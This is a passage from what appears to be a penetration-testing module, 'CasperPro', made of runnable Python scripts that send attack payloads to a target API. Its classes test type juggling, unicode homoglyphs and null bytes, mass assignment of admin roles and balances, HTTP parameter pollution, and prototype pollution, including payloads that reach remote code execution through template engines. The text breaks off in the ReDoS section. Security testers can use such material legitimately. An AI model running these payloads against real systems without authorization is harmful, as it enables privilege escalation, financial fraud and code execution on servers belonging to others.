# CasperPro Edge Cases and Hard-to-Find Issues Module

> **Advanced Testing for Subtle and Complex Vulnerabilities**  
> Type juggling, unicode normalization, mass assignment, parameter pollution, prototype pollution, and more.

## Overview

This module covers hard-to-find vulnerabilities that are often missed by automated scanners:

- **Type Juggling/Coercion** - Exploiting loose type comparisons
- **Unicode Normalization** - Bypassing filters via character encoding
- **Mass Assignment** - Overwriting protected fields
- **HTTP Parameter Pollution** - Exploiting duplicate parameters
- **Array/Object Injection** - Manipulating data structures
- **Null/Undefined Handling** - Edge cases in value processing
- **Prototype Pollution** - JavaScript object manipulation
- **ReDoS** - Regular expression denial of service

> **Python Package Manager**: All Python operations MUST use `uv`. Never use `pip`.

## 1. Type Juggling and Coercion

### 1.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_type_juggling.py
# Run with: uv run casperpro_type_juggling.py

import subprocess
import json
import sys
from dataclasses import dataclass, field
from typing import Dict, List, Any, Optional

@dataclass
class TypeJugglingTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, endpoint: str, method: str = "POST", data: Any = None, 
                 raw_body: str = None) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        
        if raw_body:
            cmd.extend(["-d", raw_body])
        elif data is not None:
            cmd.extend(["-d", json.dumps(data)])
        
        cmd.append(f"{self.base_url}{endpoint}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        return {"status": status, "body": "\n".join(lines[:-1])}
    
    def test_numeric_type_coercion(self):
        """Test numeric type juggling"""
        print("[*] Testing numeric type coercion...")
        
        # Get baseline response for user ID 1
        baseline = self._request("/user/1", "GET")
        
        payloads = [
            {"user_id": 1, "desc": "Integer"},
            {"user_id": "1", "desc": "String"},
            {"user_id": "1.0", "desc": "Float string"},
            {"user_id": 1.0, "desc": "Float"},
            {"user_id": True, "desc": "Boolean true (1)"},
            {"user_id": "0x1", "desc": "Hex string"},
            {"user_id": "1e0", "desc": "Scientific notation"},
            {"user_id": "01", "desc": "Octal-like"},
            {"user_id": " 1", "desc": "Leading space"},
            {"user_id": "1 ", "desc": "Trailing space"},
            {"user_id": "+1", "desc": "Positive sign"},
            {"user_id": "1\x00", "desc": "Null byte"},
        ]
        
        for p in payloads:
            resp = self._request("/user/lookup", "POST", {"user_id": p["user_id"]})
            
            if resp["status"] == 200 and baseline["body"] and resp["body"] == baseline["body"]:
                print(f"  [INFO] Type coercion: {p['desc']} ({p['user_id']!r}) -> user 1")
            elif resp["status"] == 200 and resp["body"]:
                print(f"  [VULN] Unexpected coercion: {p['desc']} returned data")
                self.findings.append({
                    "test": "Type Coercion",
                    "payload": p,
                    "severity": "MEDIUM"
                })
    
    def test_boolean_coercion(self):
        """Test boolean type juggling"""
        print("[*] Testing boolean coercion...")
        
        payloads = [
            {"is_admin": True},
            {"is_admin": "true"},
            {"is_admin": "True"},
            {"is_admin": "1"},
            {"is_admin": 1},
            {"is_admin": "yes"},
            {"is_admin": "on"},
            {"is_admin": []},  # Empty array -> false in some languages
            {"is_admin": {}},  # Empty object
            {"is_admin": "false"},  # String "false" is truthy!
        ]
        
        for payload in payloads:
            resp = self._request("/admin/check", "POST", payload)
            
            if resp["status"] == 200 and "granted" in resp["body"].lower():
                print(f"  [VULN] Boolean bypass: {payload}")
                self.findings.append({
                    "test": "Boolean Coercion",
                    "payload": payload,
                    "severity": "HIGH"
                })
    
    def test_array_to_string(self):
        """Test array to string coercion"""
        print("[*] Testing array to string coercion...")
        
        # Arrays may become "Array" or comma-separated when converted to string
        payloads = [
            {"password": ["admin"]},
            {"password": ["a", "d", "m", "i", "n"]},
            {"token": [None]},
            {"id": [1, 2, 3]},
        ]
        
        for payload in payloads:
            resp = self._request("/auth/login", "POST", payload)
            
            if resp["status"] == 200 and "success" in resp["body"].lower():
                print(f"  [VULN] Array coercion bypass: {payload}")
                self.findings.append({
                    "test": "Array Coercion",
                    "payload": payload,
                    "severity": "CRITICAL"
                })
    
    def test_null_vs_undefined(self):
        """Test null vs undefined handling"""
        print("[*] Testing null/undefined handling...")
        
        # These may be handled differently
        payloads = [
            ('{"user_id": null}', "null"),
            ('{"user_id": "null"}', "string null"),
            ('{"user_id": "undefined"}', "string undefined"),
            ('{"user_id": ""}', "empty string"),
            ('{}', "missing key"),
            ('{"user_id": []}', "empty array"),
            ('{"user_id": {}}', "empty object"),
            ('{"user_id": 0}', "zero"),
            ('{"user_id": false}', "false"),
            ('{"user_id": "NaN"}', "NaN string"),
        ]
        
        for raw_body, desc in payloads:
            resp = self._request("/user/data", "POST", raw_body=raw_body)
            
            if resp["status"] == 200 and resp["body"] and len(resp["body"]) > 50:
                print(f"  [VULN] {desc} returned data unexpectedly")
                self.findings.append({
                    "test": "Null/Undefined Handling",
                    "payload": raw_body,
                    "desc": desc,
                    "severity": "HIGH"
                })
    
    def test_loose_comparison(self):
        """Test loose comparison (== vs ===) issues"""
        print("[*] Testing loose comparison bypass...")
        
        # In PHP/JS, "0" == false, "" == 0, etc.
        auth_payloads = [
            {"password": 0},
            {"password": False},
            {"password": ""},
            {"password": []},
            {"password": None},
            {"token": 0},
            {"api_key": False},
        ]
        
        for payload in auth_payloads:
            resp = self._request("/auth/verify", "POST", payload)
            
            if resp["status"] == 200 and "valid" in resp["body"].lower():
                print(f"  [VULN] Loose comparison bypass: {payload}")
                self.findings.append({
                    "test": "Loose Comparison",
                    "payload": payload,
                    "severity": "CRITICAL"
                })
    
    def run_all(self):
        """Run all type juggling tests"""
        self.test_numeric_type_coercion()
        self.test_boolean_coercion()
        self.test_array_to_string()
        self.test_null_vs_undefined()
        self.test_loose_comparison()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = TypeJugglingTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 2. Unicode Normalization Attacks

### 2.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_unicode.py
# Run with: uv run casperpro_unicode.py

import subprocess
import json
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class UnicodeNormalizationTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, endpoint: str, method: str = "POST", data: dict = None) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json; charset=utf-8"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        if data:
            cmd.extend(["-d", json.dumps(data, ensure_ascii=False)])
        cmd.append(f"{self.base_url}{endpoint}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        return {"status": status, "body": "\n".join(lines[:-1])}
    
    def test_homoglyph_attack(self):
        """Test homoglyph/lookalike character attacks"""
        print("[*] Testing homoglyph attacks...")
        
        # Characters that look like ASCII but aren't
        homoglyphs = {
            "admin": [
                "аdmin",      # Cyrillic 'а'
                "admіn",      # Cyrillic 'і'
                "аdmіn",      # Multiple Cyrillic
                "ɑdmin",      # Latin alpha
                "admin",     # Fullwidth
                "ᴀᴅᴍɪɴ",      # Small caps
                "ⓐⓓⓜⓘⓝ",      # Circled
                "𝐚𝐝𝐦𝐢𝐧",      # Mathematical bold
                "𝒂𝒅𝒎𝒊𝒏",      # Mathematical italic
            ],
            "root": [
                "rооt",       # Cyrillic 'о'
                "r00t",       # Zeros
                "ʀoot",       # Small cap R
            ]
        }
        
        for target, variants in homoglyphs.items():
            for variant in variants:
                resp = self._request("/user/check", "POST", {"username": variant})
                
                if resp["status"] == 200 and target in resp["body"].lower():
                    print(f"  [VULN] Homoglyph bypass: '{variant}' resolved as '{target}'")
                    self.findings.append({
                        "test": "Homoglyph Attack",
                        "input": variant,
                        "target": target,
                        "severity": "HIGH"
                    })
    
    def test_case_mapping(self):
        """Test Unicode case mapping edge cases"""
        print("[*] Testing case mapping attacks...")
        
        # Characters with unusual case mappings
        case_payloads = [
            {"input": "ADMIN", "expected": "admin"},
            {"input": "Admin", "expected": "admin"},
            {"input": "admın", "expected": "admin"},  # Turkish dotless i
            {"input": "ADMİN", "expected": "admin"},  # Turkish dotted I
            {"input": "ﬁle", "expected": "file"},    # fi ligature
            {"input": "ﬂag", "expected": "flag"},    # fl ligature
            {"input": "ß", "expected": "ss"},         # German sharp s
            {"input": "Σ", "expected": "σ/ς"},        # Greek sigma
        ]
        
        for p in case_payloads:
            resp = self._request("/user/lookup", "POST", {"username": p["input"]})
            
            if resp["status"] == 200 and (p["expected"] in resp["body"].lower() or "found" in resp["body"].lower()):
                print(f"  [VULN] Case mapping: '{p['input']}' -> '{p['expected']}'")
                self.findings.append({
                    "test": "Case Mapping",
                    "payload": p,
                    "severity": "HIGH"
                })
    
    def test_normalization_forms(self):
        """Test different Unicode normalization forms"""
        print("[*] Testing normalization forms...")
        
        # Same character, different representations
        # é can be: U+00E9 (precomposed) or U+0065 U+0301 (decomposed)
        normalization_payloads = [
            {"char": "é", "forms": ["\u00e9", "e\u0301"]},
            {"char": "ñ", "forms": ["\u00f1", "n\u0303"]},
            {"char": "ü", "forms": ["\u00fc", "u\u0308"]},
            {"char": "ö", "forms": ["\u00f6", "o\u0308"]},
        ]
        
        for p in normalization_payloads:
            results = []
            for form in p["forms"]:
                resp = self._request("/search", "POST", {"query": f"test{form}test"})
                results.append(resp["body"])
            
            if len(set(results)) > 1:
                print(f"  [INFO] Different normalization handling for {p['char']}")
    
    def test_null_byte_injection(self):
        """Test null byte injection via Unicode"""
        print("[*] Testing null byte injection...")
        
        payloads = [
            "admin\x00.txt",
            "admin%00.txt",
            "admin\u0000.txt",
            "admin\uff00.txt",  # Fullwidth null
        ]
        
        for payload in payloads:
            resp = self._request("/file/read", "POST", {"filename": payload})
            
            if resp["status"] == 200 and "admin" in resp["body"]:
                print(f"  [VULN] Null byte injection: {repr(payload)}")
                self.findings.append({
                    "test": "Null Byte Injection",
                    "payload": repr(payload),
                    "severity": "HIGH"
                })
    
    def test_width_variants(self):
        """Test fullwidth/halfwidth character attacks"""
        print("[*] Testing width variant attacks...")
        
        # Fullwidth ASCII equivalents (U+FF01-U+FF5E)
        fullwidth_map = {
            "../": "。。/",  # Fullwidth dots
            "<script>": "<script>",  # Fullwidth
            "admin": "admin",
        }
        
        for original, fullwidth in fullwidth_map.items():
            resp = self._request("/validate", "POST", {"input": fullwidth})
            
            # Check if it bypassed filter but was normalized
            if resp["status"] == 200 and original.lower() in resp["body"].lower():
                print(f"  [VULN] Width variant bypass: {fullwidth} -> {original}")
                self.findings.append({
                    "test": "Width Variant",
                    "input": fullwidth,
                    "normalized": original,
                    "severity": "HIGH"
                })
    
    def test_combining_characters(self):
        """Test combining character attacks"""
        print("[*] Testing combining character attacks...")
        
        # Combining characters can break length checks
        payloads = [
            "a" + "\u0300" * 100,  # 'a' with 100 combining graves
            "test\u034f" * 50,     # Combining grapheme joiner
            "\u200b" * 100 + "admin",  # Zero-width spaces
            "\u200c" + "admin" + "\u200d",  # Zero-width non-joiner/joiner
        ]
        
        for payload in payloads:
            resp = self._request("/user/create", "POST", {"username": payload})
            
            if resp["status"] == 200:
                print(f"  [VULN] Combining char bypass: len={len(payload)}")
                self.findings.append({
                    "test": "Combining Characters",
                    "length": len(payload),
                    "severity": "MEDIUM"
                })
    
    def test_rtl_override(self):
        """Test right-to-left override attacks"""
        print("[*] Testing RTL override attacks...")
        
        # RTL override can make "exe.txt" appear as "txt.exe"
        rtl_payloads = [
            "innocent\u202etxt.exe",  # RLO makes it look like exe.txt
            "\u202eadmin\u202c",       # RLO + PDF
            "file\u200fname",          # Right-to-left mark
        ]
        
        for payload in rtl_payloads:
            resp = self._request("/file/upload", "POST", {"filename": payload})
            
            if resp["status"] == 200:
                print(f"  [VULN] RTL override accepted: {repr(payload)}")
                self.findings.append({
                    "test": "RTL Override",
                    "payload": repr(payload),
                    "severity": "HIGH"
                })
    
    def run_all(self):
        """Run all unicode tests"""
        self.test_homoglyph_attack()
        self.test_case_mapping()
        self.test_normalization_forms()
        self.test_null_byte_injection()
        self.test_width_variants()
        self.test_combining_characters()
        self.test_rtl_override()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = UnicodeNormalizationTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 3. Mass Assignment Vulnerabilities

### 3.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_mass_assignment.py
# Run with: uv run casperpro_mass_assignment.py

import subprocess
import json
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class MassAssignmentTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, endpoint: str, method: str = "GET", data: dict = None) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        if data:
            cmd.extend(["-d", json.dumps(data)])
        cmd.append(f"{self.base_url}{endpoint}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        body = "\n".join(lines[:-1])
        
        try:
            json_data = json.loads(body)
        except:
            json_data = {}
        
        return {"status": status, "body": body, "json": json_data}
    
    def test_privilege_escalation(self):
        """Test privilege escalation via mass assignment"""
        print("[*] Testing privilege escalation...")
        
        # Get current profile
        original = self._request("/user/profile", "GET")
        
        payloads = [
            {"name": "test", "role": "admin"},
            {"name": "test", "is_admin": True},
            {"name": "test", "admin": True},
            {"name": "test", "isAdmin": True},
            {"name": "test", "is_superuser": True},
            {"name": "test", "permissions": ["*"]},
            {"name": "test", "permissions": ["admin", "write", "delete"]},
            {"name": "test", "role_id": 1},
            {"name": "test", "group": "administrators"},
            {"name": "test", "user_type": "admin"},
            {"name": "test", "privilege_level": 999},
        ]
        
        for payload in payloads:
            # Update profile
            self._request("/user/profile", "PUT", payload)
            
            # Check if privilege changed
            updated = self._request("/user/profile", "GET")
            
            for key in ["role", "is_admin", "admin", "isAdmin", "permissions", "user_type"]:
                orig_val = original["json"].get(key)
                new_val = updated["json"].get(key)
                
                if new_val and new_val != orig_val:
                    print(f"  [VULN] Privilege escalation: {key} = {new_val}")
                    self.findings.append({
                        "test": "Privilege Escalation",
                        "field": key,
                        "value": new_val,
                        "severity": "CRITICAL"
                    })
    
    def test_account_manipulation(self):
        """Test account field manipulation"""
        print("[*] Testing account field manipulation...")
        
        original = self._request("/user/profile", "GET")
        
        payloads = [
            {"name": "test", "verified": True},
            {"name": "test", "email_verified": True},
            {"name": "test", "phone_verified": True},
            {"name": "test", "active": True},
            {"name": "test", "status": "active"},
            {"name": "test", "account_status": "premium"},
            {"name": "test", "subscription": "enterprise"},
            {"name": "test", "trial_expires": "2099-12-31"},
            {"name": "test", "locked": False},
            {"name": "test", "banned": False},
            {"name": "test", "mfa_enabled": False},
            {"name": "test", "password_reset_required": False},
        ]
        
        for payload in payloads:
            self._request("/user/profile", "PUT", payload)
            updated = self._request("/user/profile", "GET")
            
            for key, expected in payload.items():
                if key == "name":
                    continue
                orig_val = original["json"].get(key)
                new_val = updated["json"].get(key)
                
                if new_val == expected and new_val != orig_val:
                    print(f"  [VULN] Account manipulation: {key} = {new_val}")
                    self.findings.append({
                        "test": "Account Manipulation",
                        "field": key,
                        "value": new_val,
                        "severity": "HIGH"
                    })
    
    def test_financial_manipulation(self):
        """Test financial field manipulation"""
        print("[*] Testing financial field manipulation...")
        
        original = self._request("/user/profile", "GET")
        
        payloads = [
            {"name": "test", "balance": 999999},
            {"name": "test", "credits": 999999},
            {"name": "test", "points": 999999},
            {"name": "test", "wallet_balance": 999999},
            {"name": "test", "discount_percentage": 100},
            {"name": "test", "credit_limit": 999999},
            {"name": "test", "pricing_tier": "free"},
        ]
        
        for payload in payloads:
            self._request("/user/profile", "PUT", payload)
            updated = self._request("/user/profile", "GET")
            
            for key, expected in payload.items():
                if key == "name":
                    continue
                new_val = updated["json"].get(key)
                
                if new_val == expected:
                    print(f"  [VULN] Financial manipulation: {key} = {new_val}")
                    self.findings.append({
                        "test": "Financial Manipulation",
                        "field": key,
                        "value": new_val,
                        "severity": "CRITICAL"
                    })
    
    def test_metadata_injection(self):
        """Test metadata/internal field manipulation"""
        print("[*] Testing metadata injection...")
        
        payloads = [
            {"name": "test", "id": 1},
            {"name": "test", "_id": "admin_id"},
            {"name": "test", "user_id": 1},
            {"name": "test", "created_at": "2000-01-01"},
            {"name": "test", "updated_at": "2099-12-31"},
            {"name": "test", "created_by": "system"},
            {"name": "test", "tenant_id": "admin_tenant"},
            {"name": "test", "organization_id": "other_org"},
            {"name": "test", "__v": 0},
            {"name": "test", "_rev": "1-abc"},
        ]
        
        for payload in payloads:
            resp = self._request("/user/profile", "PUT", payload)
            
            if resp["status"] == 200:
                updated = self._request("/user/profile", "GET")
                
                for key, expected in payload.items():
                    if key == "name":
                        continue
                    if updated["json"].get(key) == expected:
                        print(f"  [VULN] Metadata injection: {key} = {expected}")
                        self.findings.append({
                            "test": "Metadata Injection",
                            "field": key,
                            "severity": "HIGH"
                        })
    
    def test_nested_object_assignment(self):
        """Test nested object mass assignment"""
        print("[*] Testing nested object assignment...")
        
        payloads = [
            {"name": "test", "settings": {"is_admin": True}},
            {"name": "test", "profile": {"role": "admin"}},
            {"name": "test", "metadata": {"permissions": ["*"]}},
            {"name": "test", "config": {"bypass_auth": True}},
            {"name": "test", "user": {"id": 1}},
        ]
        
        for payload in payloads:
            resp = self._request("/user/profile", "PUT", payload)
            
            if resp["status"] == 200:
                updated = self._request("/user/profile", "GET")
                
                for key in ["settings", "profile", "metadata", "config"]:
                    if key in payload and updated["json"].get(key) == payload[key]:
                        print(f"  [VULN] Nested object assignment: {key}")
                        self.findings.append({
                            "test": "Nested Object Assignment",
                            "field": key,
                            "severity": "HIGH"
                        })
    
    def run_all(self):
        """Run all mass assignment tests"""
        self.test_privilege_escalation()
        self.test_account_manipulation()
        self.test_financial_manipulation()
        self.test_metadata_injection()
        self.test_nested_object_assignment()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = MassAssignmentTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 4. HTTP Parameter Pollution

### 4.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_hpp.py
# Run with: uv run casperpro_hpp.py

import subprocess
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from urllib.parse import urlencode

@dataclass
class HPPTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, url: str, method: str = "GET") -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        return {"status": status, "body": "\n".join(lines[:-1])}
    
    def test_duplicate_parameters(self):
        """Test duplicate parameter handling"""
        print("[*] Testing duplicate parameters...")
        
        # Different servers handle duplicates differently:
        # - First value: ASP.NET, PHP (default)
        # - Last value: Apache, Python
        # - All values: ASP/IIS (comma-separated)
        
        tests = [
            # Amount manipulation
            f"{self.base_url}/transfer?amount=1&amount=1000",
            f"{self.base_url}/transfer?amount=1000&amount=1",
            
            # User ID manipulation
            f"{self.base_url}/user?id=1&id=admin",
            f"{self.base_url}/user?id=victim&id=attacker",
            
            # Action manipulation
            f"{self.base_url}/action?type=read&type=delete",
            
            # Role escalation
            f"{self.base_url}/update?role=user&role=admin",
            
            # Bypass filters
            f"{self.base_url}/search?q=normal&admin=true&q=safe",
        ]
        
        for url in tests:
            resp = self._request(url)
            
            if resp["status"] == 200:
                # Analyze which value was used
                print(f"  [INFO] HPP accepted: {url.split('?')[1][:50]}...")
                
                # Check for signs of privilege escalation
                if "admin" in resp["body"].lower() or "1000" in resp["body"]:
                    print(f"  [VULN] HPP exploitation possible")
                    self.findings.append({
                        "test": "HTTP Parameter Pollution",
                        "url": url,
                        "severity": "HIGH"
                    })
    
    def test_array_parameters(self):
        """Test array parameter injection"""
        print("[*] Testing array parameters...")
        
        tests = [
            # PHP array syntax
            f"{self.base_url}/users?id[]=1&id[]=2&id[]=3",
            f"{self.base_url}/users?id[0]=1&id[1]=2",
            
            # Multiple same-name params
            f"{self.base_url}/users?id=1&id=2&id=3",
            
            # Bracket injection
            f"{self.base_url}/filter?role[admin]=true",
            f"{self.base_url}/filter?user[role]=admin",
        ]
        
        for url in tests:
            resp = self._request(url)
            
            if resp["status"] == 200 and ("multiple" in resp["body"].lower() or 
                                          resp["body"].count('"id"') > 1):
                print(f"  [VULN] Array parameter accepted: {url.split('?')[1][:30]}...")
                self.findings.append({
                    "test": "Array Parameter",
                    "url": url,
                    "severity": "MEDIUM"
                })
    
    def test_parameter_order(self):
        """Test parameter order sensitivity"""
        print("[*] Testing parameter order...")
        
        # Some apps process only first/last occurrence
        orderings = [
            (f"{self.base_url}/api?a=1&b=2", f"{self.base_url}/api?b=2&a=1"),
            (f"{self.base_url}/api?admin=false&admin=true", f"{self.base_url}/api?admin=true&admin=false"),
        ]
        
        for url1, url2 in orderings:
            resp1 = self._request(url1)
            resp2 = self._request(url2)
            
            if resp1["body"] != resp2["body"]:
                print(f"  [INFO] Order-sensitive parameters detected")
                self.findings.append({
                    "test": "Parameter Order Sensitivity",
                    "severity": "LOW"
                })
    
    def test_encoding_variants(self):
        """Test different encoding for same parameter"""
        print("[*] Testing encoding variants...")
        
        # Same parameter with different encodings
        tests = [
            (f"{self.base_url}/search?q=admin", f"{self.base_url}/search?q=%61%64%6d%69%6e"),
            (f"{self.base_url}/search?q=admin", f"{self.base_url}/search?%71=admin"),
        ]
        
        for url1, url2 in tests:
            resp1 = self._request(url1)
            resp2 = self._request(url2)
            
            if resp1["status"] == 200 and resp2["status"] == 200:
                if resp1["body"] == resp2["body"]:
                    print(f"  [INFO] URL encoding normalized")
                else:
                    print(f"  [VULN] Different encoding = different handling")
                    self.findings.append({
                        "test": "Encoding Variant",
                        "severity": "MEDIUM"
                    })
    
    def run_all(self):
        """Run all HPP tests"""
        self.test_duplicate_parameters()
        self.test_array_parameters()
        self.test_parameter_order()
        self.test_encoding_variants()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = HPPTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 5. Prototype Pollution

### 5.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_prototype_pollution.py
# Run with: uv run casperpro_prototype_pollution.py

import subprocess
import json
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class PrototypePollutionTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, endpoint: str, method: str = "POST", 
                 data: dict = None, raw_body: str = None) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        
        if raw_body:
            cmd.extend(["-d", raw_body])
        elif data:
            cmd.extend(["-d", json.dumps(data)])
        
        cmd.append(f"{self.base_url}{endpoint}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        body = "\n".join(lines[:-1])
        
        try:
            json_data = json.loads(body)
        except:
            json_data = {}
        
        return {"status": status, "body": body, "json": json_data}
    
    def test_proto_injection(self):
        """Test __proto__ injection"""
        print("[*] Testing __proto__ injection...")
        
        payloads = [
            '{"__proto__": {"admin": true}}',
            '{"__proto__": {"isAdmin": true}}',
            '{"__proto__": {"role": "admin"}}',
            '{"__proto__": {"authenticated": true}}',
            '{"__proto__": {"verified": true}}',
            '{"__proto__": {"canDelete": true}}',
        ]
        
        for payload in payloads:
            # Send pollution payload
            self._request("/settings", "POST", raw_body=payload)
            
            # Check if pollution affected other endpoints
            check = self._request("/user/profile", "GET")
            
            if check["json"].get("admin") or check["json"].get("isAdmin") or \
               check["json"].get("role") == "admin":
                print(f"  [VULN] __proto__ pollution successful")
                self.findings.append({
                    "test": "__proto__ Pollution",
                    "payload": payload,
                    "severity": "CRITICAL"
                })
                break
    
    def test_constructor_pollution(self):
        """Test constructor.prototype pollution"""
        print("[*] Testing constructor.prototype pollution...")
        
        payloads = [
            '{"constructor": {"prototype": {"admin": true}}}',
            '{"constructor": {"prototype": {"role": "admin"}}}',
        ]
        
        for payload in payloads:
            self._request("/settings", "POST", raw_body=payload)
            check = self._request("/user/profile", "GET")
            
            if check["json"].get("admin") or check["json"].get("role") == "admin":
                print(f"  [VULN] constructor.prototype pollution successful")
                self.findings.append({
                    "test": "Constructor Pollution",
                    "payload": payload,
                    "severity": "CRITICAL"
                })
                break
    
    def test_nested_proto(self):
        """Test nested __proto__ pollution"""
        print("[*] Testing nested __proto__ pollution...")
        
        payloads = [
            '{"user": {"__proto__": {"admin": true}}}',
            '{"data": {"__proto__": {"role": "admin"}}}',
            '{"config": {"__proto__": {"canBypass": true}}}',
        ]
        
        for payload in payloads:
            resp = self._request("/update", "POST", raw_body=payload)
            
            if resp["status"] == 200:
                check = self._request("/user/profile", "GET")
                if "admin" in str(check["json"]):
                    print(f"  [VULN] Nested __proto__ pollution")
                    self.findings.append({
                        "test": "Nested Proto Pollution",
                        "payload": payload,
                        "severity": "CRITICAL"
                    })
    
    def test_dot_notation_proto(self):
        """Test dot notation prototype pollution"""
        print("[*] Testing dot notation pollution...")
        
        payloads = [
            {"__proto__.admin": True},
            {"__proto__.role": "admin"},
            {"constructor.prototype.admin": True},
            {"a].__proto__[b": True},
        ]
        
        for payload in payloads:
            self._request("/settings", "POST", data=payload)
            check = self._request("/user/profile", "GET")
            
            if check["json"].get("admin"):
                print(f"  [VULN] Dot notation pollution: {list(payload.keys())[0]}")
                self.findings.append({
                    "test": "Dot Notation Pollution",
                    "payload": payload,
                    "severity": "CRITICAL"
                })
    
    def test_proto_rce(self):
        """Test prototype pollution to RCE"""
        print("[*] Testing proto pollution to RCE...")
        
        # These payloads target specific frameworks
        rce_payloads = [
            # Pug/Jade template engine
            '{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require(\'child_process\').execSync(\'id\')"}}}',
            
            # EJS template engine
            '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\'child_process\').execSync(\'id\');x"}}',
            
            # Handlebars
            '{"__proto__": {"pendingContent": "process.mainModule.require(\'child_process\').execSync(\'id\')"}}',
        ]
        
        for payload in rce_payloads:
            resp = self._request("/render", "POST", raw_body=payload)
            
            if "uid=" in resp["body"] or "root" in resp["body"]:
                print(f"  [VULN] Prototype pollution to RCE!")
                self.findings.append({
                    "test": "Proto Pollution RCE",
                    "severity": "CRITICAL"
                })
                break
    
    def run_all(self):
        """Run all prototype pollution tests"""
        self.test_proto_injection()
        self.test_constructor_pollution()
        self.test_nested_proto()
        self.test_dot_notation_proto()
        self.test_proto_rce()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = PrototypePollutionTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 6. ReDoS (Regular Expression Denial of Service)

### 6.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_redos.py
# Run with: uv run casperpro_redos.py

import subprocess
import json
import sys
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class ReDoSTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    threshold_seconds: float = 5.0
    findings: List[Dict] = field(default_factory=list)
    
    def _timed_request(self, endpoint: str, data: dict) -> tuple:
        """Make request and measure response time"""
        cmd = ["curl", "-s", "-w", "\n%{time_total}", "-X", "POST",
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json",
               "-d", json.dumps(data),
               "--max-time", "30"]
        
        if self.proxy:
